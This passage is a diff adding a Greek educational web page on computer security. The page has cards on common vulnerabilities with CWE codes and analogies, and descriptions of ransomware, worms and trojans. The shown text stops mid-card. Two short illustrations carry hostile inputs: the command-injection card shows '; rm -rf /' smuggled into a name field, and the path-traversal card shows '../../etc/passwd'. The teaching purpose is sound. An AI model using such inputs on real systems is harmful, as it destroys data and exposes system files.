@@ -1,0 +1,1702 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ασφάλεια Η/Υ — Ευπάθειες, Malware &amp; Event IDs</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            background-color: #0d1117;
+            color: #e6edf3;
+            line-height: 1.6;
+            padding: 2rem 1rem;
+            min-height: 100vh;
+        }
+        .container { max-width: 1150px; margin: 0 auto; }
+        header {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid #30363d;
+        }
+        header h1 {
+            font-size: 2.2rem;
+            font-weight: 600;
+            color: #f0f6fc;
+            letter-spacing: -0.5px;
+        }
+        header p { color: #8b949e; margin-top: 0.5rem; font-size: 1.05rem; }
+        .tabs {
+            display: flex;
+            gap: 0.25rem;
+            border-bottom: 1px solid #30363d;
+            margin-bottom: 2rem;
+            overflow-x: auto;
+        }
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            padding: 0.85rem 1.5rem;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            border-bottom: 3px solid transparent;
+            white-space: nowrap;
+            transition: color 0.15s ease, border-color 0.15s ease;
+            font-family: inherit;
+        }
+        .tab-btn:hover { color: #c9d1d9; }
+        .tab-btn.active {
+            color: #f0f6fc;
+            border-bottom-color: #58a6ff;
+        }
+        .tab-panel { display: none; }
+        .tab-panel.active { display: block; animation: fadeIn 0.2s ease-out; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(330px, 1fr));
+            gap: 1.25rem;
+        }
+        .card {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 1.25rem 1.5rem;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            display: flex;
+            flex-direction: column;
+        }
+        .card:hover {
+            border-color: #58a6ff;
+            box-shadow: 0 0 0 1px #58a6ff33;
+        }
+        .card-header {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 0.75rem;
+            margin-bottom: 0.6rem;
+        }
+        .card-header h2 {
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: #f0f6fc;
+            line-height: 1.3;
+        }
+        .cwe-badge {
+            background-color: #1f2a3a;
+            color: #79c0ff;
+            font-size: 0.72rem;
+            font-weight: 600;
+            padding: 0.2rem 0.6rem;
+            border-radius: 20px;
+            white-space: nowrap;
+            border: 1px solid #1f4a7a;
+            flex-shrink: 0;
+        }
+        .card p.short-desc {
+            color: #8b949e;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            flex-grow: 1;
+        }
+        .toggle-btn {
+            background-color: #21262d;
+            color: #c9d1d9;
+            border: 1px solid #30363d;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.15s ease, border-color 0.15s ease;
+            align-self: flex-start;
+            margin-top: auto;
+            font-family: inherit;
+        }
+        .toggle-btn:hover {
+            background-color: #30363d;
+            border-color: #58a6ff;
+            color: #f0f6fc;
+        }
+        .toggle-btn:focus-visible { outline: 2px solid #58a6ff; outline-offset: 2px; }
+        .details {
+            display: none;
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid #21262d;
+            color: #c9d1d9;
+            font-size: 0.9rem;
+        }
+        .details.open { display: block; }
+        .details p { margin-bottom: 0.75rem; }
+        .details p:last-of-type { margin-bottom: 0; }
+        .details h4 {
+            color: #79c0ff;
+            font-size: 0.88rem;
+            font-weight: 600;
+            margin-top: 1rem;
+            margin-bottom: 0.4rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .details h4:first-child { margin-top: 0; }
+        .cwe-code {
+            display: inline-block;
+            background-color: #1f2a3a;
+            color: #79c0ff;
+            font-weight: 600;
+            padding: 0.15rem 0.5rem;
+            border-radius: 6px;
+            font-size: 0.78rem;
+            border: 1px solid #1f4a7a;
+            margin: 0.1rem 0.15rem 0.1rem 0;
+        }
+        .cwe-link {
+            display: inline-block;
+            background-color: #1f2a3a;
+            color: #79c0ff;
+            font-weight: 600;
+            padding: 0.15rem 0.55rem;
+            border-radius: 6px;
+            font-size: 0.78rem;
+            border: 1px solid #1f4a7a;
+            margin: 0.1rem 0.15rem 0.1rem 0;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.15s ease;
+        }
+        .cwe-link:hover {
+            background-color: #1f4a7a;
+            border-color: #58a6ff;
+            color: #cae8ff;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 6px rgba(88, 166, 255, 0.25);
+        }
+        .cwe-link:active { transform: translateY(0); }
+        .cwe-link:focus-visible { outline: 2px solid #58a6ff; outline-offset: 2px; }
+        .analogy {
+            background-color: #0d1117;
+            border-left: 3px solid #58a6ff;
+            padding: 0.6rem 0.9rem;
+            border-radius: 0 6px 6px 0;
+            margin-top: 0.75rem;
+            font-style: italic;
+            color: #8b949e;
+            font-size: 0.85rem;
+        }
+        .sev {
+            display: inline-block;
+            font-size: 0.72rem;
+            font-weight: 700;
+            padding: 0.18rem 0.55rem;
+            border-radius: 6px;
+            letter-spacing: 0.4px;
+            text-transform: uppercase;
+        }
+        .sev-critical { background: #4a0e0e; color: #ff8080; border: 1px solid #8b1a1a; }
+        .sev-high     { background: #4a2a0e; color: #ffb86c; border: 1px solid #8b4a1a; }
+        .sev-medium   { background: #4a420e; color: #ffe066; border: 1px solid #8b7a1a; }
+        .sev-low      { background: #0e3a4a; color: #7dd3fc; border: 1px solid #1a6a8b; }
+        .sev-info     { background: #21262d; color: #8b949e; border: 1px solid #30363d; }
+        .example-btn {
+            margin-top: 0.9rem;
+            background-color: #1f6feb;
+            color: #ffffff;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.15s ease, transform 0.1s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-family: inherit;
+        }
+        .example-btn:hover { background-color: #388bfd; }
+        .example-btn:active { transform: scale(0.97); }
+        .example-btn:focus-visible { outline: 2px solid #79c0ff; outline-offset: 2px; }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.82);
+            z-index: 1000;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 2rem 1rem;
+            overflow-y: auto;
+            backdrop-filter: blur(3px);
+        }
+        .modal-overlay.open { display: flex; }
+        .modal {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            max-width: 900px;
+            width: 100%;
+            padding: 1.75rem 2rem 2rem;
+            position: relative;
+            margin: auto;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.18s ease-out;
+        }
+        .modal.narrow { max-width: 600px; }
+        .modal-close {
+            position: absolute;
+            top: 0.7rem;
+            right: 1rem;
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            font-size: 1.9rem;
+            cursor: pointer;
+            line-height: 1;
+            padding: 0.25rem 0.5rem;
+            border-radius: 6px;
+            transition: color 0.15s ease, background-color 0.15s ease;
+            font-family: inherit;
+        }
+        .modal-close:hover { color: #f0f6fc; background: #21262d; }
+        .modal h3 {
+            color: #f0f6fc;
+            margin-bottom: 1.5rem;
+            padding-right: 2.5rem;
+            font-size: 1.3rem;
+            font-weight: 600;
+            border-bottom: 1px solid #30363d;
+            padding-bottom: 0.75rem;
+        }
+        .modal-section { margin-bottom: 1.5rem; }
+        .modal-section:last-child { margin-bottom: 0; }
+        .modal-section h4 {
+            color: #79c0ff;
+            font-size: 1rem;
+            margin-bottom: 0.6rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 600;
+        }
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-left: 4px solid #f85149;
+            border-radius: 8px;
+            padding: 0.9rem 1.1rem;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.82rem;
+            color: #c9d1d9;
+            line-height: 1.55;
+            white-space: pre;
+            margin: 0;
+        }
+        .code-block.exploit { border-left-color: #f0883e; }
+        .modal-section p {
+            color: #c9d1d9;
+            font-size: 0.93rem;
+            line-height: 1.75;
+        }
+        .modal-section p strong { color: #f0f6fc; }
+        .modal-section p code {
+            background: #21262d;
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-family: 'Consolas', monospace;
+            font-size: 0.85em;
+            color: #79c0ff;
+        }
+        .cwe-pop-name {
+            color: #f0f6fc;
+            font-size: 1.05rem;
+            font-weight: 600;
+            margin-bottom: 0.75rem;
+        }
+        .cwe-pop-desc {
+            color: #c9d1d9;
+            font-size: 0.95rem;
+            line-height: 1.75;
+        }
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #30363d;
+            color: #484f58;
+            font-size: 0.8rem;
+        }
+        footer .signature {
+            display: block;
+            margin-top: 0.75rem;
+            font-size: 0.78rem;
+            color: #484f58;
+            letter-spacing: 0.08em;
+            opacity: 0.75;
+            font-style: italic;
+        }
+        @media (max-width: 600px) {
+            header h1 { font-size: 1.6rem; }
+            .grid { grid-template-columns: 1fr; }
+            .modal { padding: 1.25rem 1rem 1.5rem; }
+            .tab-btn { padding: 0.75rem 1rem; font-size: 0.9rem; }
+        }
+
+        /* ---------- Λεξικό Όρων: κουμπί + pop-up ---------- */
+        .glossary-btn {
+            position: fixed;
+            top: 1rem;
+            right: 1rem;
+            z-index: 900;
+            background-color: #1f6feb;
+            color: #ffffff;
+            border: 1px solid #388bfd;
+            padding: 0.55rem 1rem;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.45);
+            transition: background-color 0.15s ease, transform 0.1s ease;
+        }
+        .glossary-btn:hover { background-color: #388bfd; }
+        .glossary-btn:active { transform: scale(0.97); }
+        .glossary-btn:focus-visible { outline: 2px solid #79c0ff; outline-offset: 2px; }
+
+        /* ---------- Κουμπί Επιστροφής στην Αρχική ---------- */
+        .home-btn {
+            position: fixed;
+            top: 1rem;
+            left: 1rem;
+            z-index: 900;
+            background-color: #21262d;
+            color: #e6edf3;
+            border: 1px solid #30363d;
+            padding: 0.55rem 1rem;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            font-family: inherit;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.45);
+            transition: background-color 0.15s ease, border-color 0.15s ease, transform 0.1s ease;
+        }
+        .home-btn:hover {
+            background-color: #30363d;
+            border-color: #58a6ff;
+            color: #f0f6fc;
+        }
+        .home-btn:active { transform: scale(0.97); }
+        .home-btn:focus-visible { outline: 2px solid #79c0ff; outline-offset: 2px; }
+
+        .glossary-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.82);
+            z-index: 1100;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem 1rem;
+            backdrop-filter: blur(3px);
+        }
+        .glossary-overlay.open { display: flex; }
+
+        .glossary-window {
+            position: relative;
+            width: 100%;
+            max-width: 900px;
+            height: 88vh;
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.18s ease-out;
+        }
+        .glossary-window iframe {
+            display: block;
+            width: 100%;
+            height: 100%;
+            border: 0;
+            background: #0a0e13;
+        }
+        .glossary-close {
+            position: absolute;
+            top: 0.45rem;
+            right: 0.7rem;
+            z-index: 2;
+            background: rgba(13, 17, 23, 0.78);
+            border: 1px solid #30363d;
+            color: #8b949e;
+            font-size: 1.6rem;
+            line-height: 1;
+            padding: 0.15rem 0.55rem 0.3rem;
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: color 0.15s ease, background-color 0.15s ease, border-color 0.15s ease;
+        }
+        .glossary-close:hover { color: #f0f6fc; background: #21262d; border-color: #58a6ff; }
+        .glossary-close:focus-visible { outline: 2px solid #58a6ff; outline-offset: 2px; }
+
+        @media (max-width: 600px) {
+            .glossary-btn { font-size: 0.76rem; padding: 0.4rem 0.65rem; top: 0.5rem; right: 0.5rem; }
+            .home-btn { font-size: 0.76rem; padding: 0.4rem 0.65rem; top: 0.5rem; left: 0.5rem; }
+            header { padding-top: 2.2rem; }
+            .glossary-overlay { padding: 0.75rem 0.5rem; }
+            .glossary-window { height: 92vh; border-radius: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+<a class="home-btn" href="index.html" title="Επιστροφή στην αρχική σελίδα">🏠 Αρχική</a>
+
+<button class="glossary-btn" id="glossaryOpen" type="button" title="Άνοιγμα λεξικού όρων κυβερνοασφάλειας">📖 Λεξικό Όρων</button>
+
+<!-- Pop-up: Λεξικό Όρων -->
+<div class="glossary-overlay" id="glossaryOverlay">
+    <div class="glossary-window" role="dialog" aria-modal="true" aria-label="Λεξικό Όρων Κυβερνοασφάλειας">
+        <button class="glossary-close" id="glossaryClose" aria-label="Κλείσιμο">×</button>
+        <iframe id="glossaryFrame"
+                data-src="lexiko-orwn-kyvernoasfaleias.html"
+                title="Λεξικό Όρων Κυβερνοασφάλειας"></iframe>
+    </div>
+</div>
+
+<div class="container">
+
+    <header>
+        <h1>🛡️ Ασφάλεια Η/Υ</h1>
+        <p>Ευπάθειες Λογισμικού · Κακόβουλο Λογισμικό · Windows Event IDs</p>
+    </header>
+
+    <div class="tabs" role="tablist">
+        <button class="tab-btn active" data-tab="tab-vulns" role="tab">🔓 Ευπάθειες</button>
+        <button class="tab-btn" data-tab="tab-malware" role="tab">🦠 Κακόβουλο Λογισμικό</button>
+        <button class="tab-btn" data-tab="tab-events" role="tab">📋 Event IDs</button>
+    </div>
+
+    <!-- ================= TAB 1 : ΕΥΠΑΘΕΙΕΣ ================= -->
+    <div class="tab-panel active" id="tab-vulns">
+        <div class="grid">
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>SQL Injection</h2>
+                    <span class="cwe-badge">CWE-89</span>
+                </div>
+                <p class="short-desc">Ο επιτιθέμενος εισάγει κακόβουλες εντολές SQL μέσω φόρμας, αποκτώντας πρόσβαση στη βάση.</p>
+                <button class="toggle-btn" data-target="sql-injection">Ανάλυση</button>
+                <div class="details" id="sql-injection">
+                    <p>Φαντάσου ότι η εφαρμογή παίρνει ό,τι πληκτρολογεί ο χρήστης και το κολλάει κατευθείαν στην εντολή της βάσης, χωρίς έλεγχο. Έτσι ο επιτιθέμενος μπορεί να δει, να αλλάξει ή να διαγράψει δεδομένα.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-89</span></p>
+                    <div class="analogy">Ανάλογο: Δίνεις σε κάποιον κλειδί για το σπίτι σου επειδή σου είπε «είμαι φίλος», χωρίς να ρωτήσεις.</div>
+                    <button class="example-btn" data-example="sql-injection">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Cross-Site Scripting (XSS)</h2>
+                    <span class="cwe-badge">CWE-79</span>
+                </div>
+                <p class="short-desc">Ο επιτιθέμενος εισάγει JavaScript σε μια σελίδα, η οποία εκτελείται στον browser του θύματος.</p>
+                <button class="toggle-btn" data-target="xss">Ανάλυση</button>
+                <div class="details" id="xss">
+                    <p>Γράφεις ένα σχόλιο και αντί για «Γεια σου» βάζεις κώδικα που λέει «δείξε τα cookies μου». Αν το site δεν καθαρίζει το κείμενο, ο κώδικας εκτελείται στον browser άλλων.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-79</span></p>
+                    <div class="analogy">Ανάλογο: Αφήνεις σημείωμα στον πίνακα ανακοινώσεων και κάποιος γράφει από κάτω μια κακόβουλη οδηγία.</div>
+                    <button class="example-btn" data-example="xss">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Cross-Site Request Forgery</h2>
+                    <span class="cwe-badge">CWE-352</span>
+                </div>
+                <p class="short-desc">Ο επιτιθέμενος εξαπατά τον browser του θύματος να στείλει αίτημα σε άλλο site όπου είναι συνδεδεμένος.</p>
+                <button class="toggle-btn" data-target="csrf">Ανάλυση</button>
+                <div class="details" id="csrf">
+                    <p>Είσαι συνδεδεμένος στην τράπεζα και επισκέπτεσαι ένα κακόβουλο site. Αυτό στέλνει κρυφά εντολή «μετάφερε 1000€» στην τράπεζα, και επειδή έχεις τα cookies, εκτελείται.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-352</span></p>
+                    <div class="analogy">Ανάλογο: Κάποιος παριστάνει εσένα στην τράπεζα επειδή έχει το βιβλιάριό σου.</div>
+                    <button class="example-btn" data-example="csrf">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Buffer Overflow</h2>
+                    <span class="cwe-badge">CWE-120/121/122</span>
+                </div>
+                <p class="short-desc">Γράφονται περισσότερα δεδομένα από όσα χωράει ένα buffer, καταστρέφοντας γειτονική μνήμη.</p>
+                <button class="toggle-btn" data-target="buffer-overflow">Ανάλυση</button>
+                <div class="details" id="buffer-overflow">
+                    <p>Ένα buffer είναι μνήμη συγκεκριμένου μεγέθους. Αν γραφτούν περισσότερα bytes, «χύνονται» σε γειτονικές μνήμες. Ο επιτιθέμενος μπορεί να αλλάξει τη ροή του προγράμματος.</p>
+                    <p>Κωδικοί CWE: <span class="cwe-code">CWE-120</span> / <span class="cwe-code">CWE-121</span> / <span class="cwe-code">CWE-122</span></p>
+                    <div class="analogy">Ανάλογο: Βάζεις 10 βιβλία σε ράφι που χωράει 5. Τα υπόλοιπα πέφτουν και χτυπούν άλλα.</div>
+                    <button class="example-btn" data-example="buffer-overflow">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>OS Command Injection</h2>
+                    <span class="cwe-badge">CWE-78</span>
+                </div>
+                <p class="short-desc">Ο επιτιθέμενος εκτελεί εντολές του λειτουργικού μέσω εφαρμογής που δεν ελέγχει την είσοδο.</p>
+                <button class="toggle-btn" data-target="command-injection">Ανάλυση</button>
+                <div class="details" id="command-injection">
+                    <p>Μια εφαρμογή σου ζητά το όνομά σου. Αντί για όνομα δίνεις «; rm -rf /» και το σύστημα εκτελεί τη διαγραφή. Συμβαίνει όταν το πρόγραμμα περνάει το κείμενο σε shell χωρίς έλεγχο.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-78</span></p>
+                    <div class="analogy">Ανάλογο: Λες σε φίλο «πάρε μου γάλα» και αυτός φέρνει ό,τι θέλει.</div>
+                    <button class="example-btn" data-example="command-injection">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Path Traversal</h2>
+                    <span class="cwe-badge">CWE-22</span>
+                </div>
+                <p class="short-desc">Χρήση ακολουθιών όπως «../» για ανάγνωση αρχείων έξω από τον επιτρεπόμενο κατάλογο.</p>
+                <button class="toggle-btn" data-target="path-traversal">Ανάλυση</button>
+                <div class="details" id="path-traversal">
+                    <p>Το site σου επιτρέπει να βλέπεις μόνο αρχεία από τον φάκελο «Φωτογραφίες». Αν βάλεις «../../etc/passwd» φτάνεις σε ευαίσθητα αρχεία συστήματος.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-22</span></p>
+                    <div class="analogy">Ανάλογο: Σου λένε «μείνε στην αυλή» και εσύ σκαρφαλώνεις τον φράχτη.</div>
+                    <button class="example-btn" data-example="path-traversal">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Missing Authorization</h2>
+                    <span class="cwe-badge">CWE-862</span>
+                </div>
+                <p class="short-desc">Η εφαρμογή δεν ελέγχει αν ο χρήστης έχει δικαίωμα να εκτελέσει μια ενέργεια.</p>
+                <button class="toggle-btn" data-target="missing-auth">Ανάλυση</button>
+                <div class="details" id="missing-auth">
+                    <p>Μια σελίδα διαχειριστή δεν ελέγχει αν ο χρήστης είναι admin. Οποιοσδήποτε μπορεί να τη δει. Συχνά συμβαίνει σε APIs όπου οι έλεγχοι γίνονται μόνο στο frontend.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-862</span></p>
+                    <div class="analogy">Ανάλογο: Σχολείο που δεν ελέγχει αν είσαι μαθητής και αφήνει τον καθένα να μπει στην τάξη.</div>
+                    <button class="example-btn" data-example="missing-auth">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Unrestricted File Upload</h2>
+                    <span class="cwe-badge">CWE-434</span>
+                </div>
+                <p class="short-desc">Επιτρέπεται το ανέβασμα αρχείων οποιουδήποτε τύπου, ακόμα και κακόβουλου κώδικα.</p>
+                <button class="toggle-btn" data-target="file-upload">Ανάλυση</button>
+                <div class="details" id="file-upload">
+                    <p>Αντί για εικόνα, ο επιτιθέμενος ανεβάζει ένα PHP αρχείο. Αν ο server το εκτελέσει, μπορεί να εκτελεί εντολές από απόσταση (webshell).</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-434</span></p>
+                    <div class="analogy">Ανάλογο: Αφήνεις κουτί στην είσοδο και κάποιος βάζει μέσα ιό.</div>
+                    <button class="example-btn" data-example="file-upload">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Use After Free</h2>
+                    <span class="cwe-badge">CWE-416</span>
+                </div>
+                <p class="short-desc">Το πρόγραμμα χρησιμοποιεί μνήμη που έχει ήδη ελευθερωθεί, οδηγώντας σε αστάθεια ή εκτέλεση κώδικα.</p>
+                <button class="toggle-btn" data-target="use-after-free">Ανάλυση</button>
+                <div class="details" id="use-after-free">
+                    <p>Όταν ένα κομμάτι μνήμης ελευθερώνεται, μπορεί να ξαναχρησιμοποιηθεί από άλλο πρόγραμμα. Αν ο παλιός κώδικας το χρησιμοποιήσει ξανά, διαβάζει/αλλάζει δεδομένα άλλου.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-416</span></p>
+                    <div class="analogy">Ανάλογο: Επιστρέφεις βιβλίο στη βιβλιοθήκη και μετά το παίρνεις κρυφά χωρίς να το δηλώσεις.</div>
+                    <button class="example-btn" data-example="use-after-free">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Improper Input Validation</h2>
+                    <span class="cwe-badge">CWE-20</span>
+                </div>
+                <p class="short-desc">Η εφαρμογή δεν ελέγχει σωστά τα δεδομένα εισόδου, επιτρέποντας κακόβουλα δεδομένα.</p>
+                <button class="toggle-btn" data-target="input-validation">Ανάλυση</button>
+                <div class="details" id="input-validation">
+                    <p>Ρωτάς «πόσα μήλα θέλεις;» και σου απαντούν «ένα εκατομμύριο». Αν δεν ελέγξεις, θα προσπαθήσεις να τα μετρήσεις και θα καταρρεύσεις. Είναι η ρίζα πολλών άλλων ευπαθειών.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-20</span></p>
+                    <div class="analogy">Ανάλογο: Δέχεσαι απάντηση «1.000.000» σε ερώτηση «πόσα μήλα;» χωρίς έλεγχο.</div>
+                    <button class="example-btn" data-example="input-validation">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Insecure Authentication</h2>
+                    <span class="cwe-badge">CWE-287</span>
+                </div>
+                <p class="short-desc">Ο μηχανισμός σύνδεσης δεν είναι ασφαλής, επιτρέποντας παράκαμψη του ελέγχου ταυτότητας.</p>
+                <button class="toggle-btn" data-target="insecure-auth">Ανάλυση</button>
+                <div class="details" id="insecure-auth">
+                    <p>Η κλειδαριά ανοίγει με απλό σπρώξιμο. Η εφαρμογή δεν ελέγχει σωστά τα στοιχεία σύνδεσης: αδύναμα passwords, χωρίς rate limiting, λάθος συγκρίσεις.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-287</span></p>
+                    <div class="analogy">Ανάλογο: Αφήνεις το κλειδί κάτω από το χαλάκι — όποιος ξέρει πού είναι, μπαίνει.</div>
+                    <button class="example-btn" data-example="insecure-auth">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Hardcoded Credentials</h2>
+                    <span class="cwe-badge">CWE-798</span>
+                </div>
+                <p class="short-desc">Κωδικοί ή κλειδιά είναι γραμμένα μέσα στον κώδικα, εκτεθειμένα σε όποιον δει το project.</p>
+                <button class="toggle-btn" data-target="hardcoded-creds">Ανάλυση</button>
+                <div class="details" id="hardcoded-creds">
+                    <p>Έχεις γράψει τον κωδικό σου πάνω στο βιβλίο σου με μαρκαδόρο. Όταν οι προγραμματιστές γράφουν «admin:1234» μέσα στον κώδικα, όποιος δει το GitHub τους, μπαίνει.</p>
+                    <p>Κωδικός CWE: <span class="cwe-code">CWE-798</span></p>
+                    <div class="analogy">Ανάλογο: Κρύβεις το κλειδί κάτω από τη γλάστρα — όλοι το ξέρουν.</div>
+                    <button class="example-btn" data-example="hardcoded-creds">📖 Παράδειγμα</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ================= TAB 2 : ΚΑΚΟΒΟΥΛΟ ΛΟΓΙΣΜΙΚΟ ================= -->
+    <div class="tab-panel" id="tab-malware">
+        <div class="grid">
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Ransomware</h2>
+                    <span class="cwe-badge">Ransomware</span>
+                </div>
+                <p class="short-desc">Κρυπτογραφεί τα αρχεία του θύματος και απαιτεί λύτρα για να τα ξεκλειδώσει.</p>
+                <button class="toggle-btn" data-target="m-ransomware">Ανάλυση</button>
+                <div class="details" id="m-ransomware">
+                    <h4>Τι είναι</h4>
+                    <p>Κακόβουλο λογισμικό που «παίρνει όμηρο» τα αρχεία σου. Μόλις μολύνει τον υπολογιστή, κρυπτογραφεί τα πάντα και απαιτεί πληρωμή σε Bitcoin. Χωρίς backup, τα δεδομένα χάνονται οριστικά.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>Phishing email, exploit kits, RDP με αδύναμα passwords.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-89">CWE-89</button>
+                        <button class="cwe-link" data-cwe="CWE-434">CWE-434</button>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Offline backups (3-2-1), ενημερώσεις, ισχυροί κωδικοί, 2FA, EDR. <strong>Ποτέ</strong> δεν πληρώνουμε λύτρα.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>WannaCry (2017):</strong> 200.000+ υπολογιστές σε 150 χώρες μέσω EternalBlue. Ζημιά $4 δισ.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Worm (Σκουλήκι)</h2>
+                    <span class="cwe-badge">Worm</span>
+                </div>
+                <p class="short-desc">Αυτο-αναπαράγεται και εξαπλώνεται μέσω δικτύου χωρίς ανθρώπινη ενέργεια.</p>
+                <button class="toggle-btn" data-target="m-worm">Ανάλυση</button>
+                <div class="details" id="m-worm">
+                    <h4>Τι είναι</h4>
+                    <p>Πρόγραμμα που αντιγράφει τον εαυτό του από μηχάνημα σε μηχάνημα αυτόματα. Σαρώνει το δίκτυο και μολύνει όποιον βρει ευάλωτο.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>Μη ενημερωμένα λειτουργικά, ανοιχτές θύρες SMB/RDP, default credentials σε IoT.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                        <button class="cwe-link" data-cwe="CWE-798">CWE-798</button>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Ενημερώσεις, firewall, κλείσιμο περιττών υπηρεσιών, network segmentation.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>Morris Worm (1988):</strong> 10% του τότε Internet. <strong>Stuxnet (2010):</strong> Κατέστρεψε φυγοκεντρητές στο Ιράν.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Trojan Horse</h2>
+                    <span class="cwe-badge">Trojan</span>
+                </div>
+                <p class="short-desc">Μεταμφιέζεται σε νόμιμο λογισμικό, αλλά κρύβει κακόβουλο κώδικα.</p>
+                <button class="toggle-btn" data-target="m-trojan">Ανάλυση</button>
+                <div class="details" id="m-trojan">
+                    <h4>Τι είναι</h4>
+                    <p>Όπως ο Δούρειος Ίππος: φαίνεται χρήσιμο, αλλά όταν το τρέξεις εγκαθιστά backdoor ή κλέβει δεδομένα.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
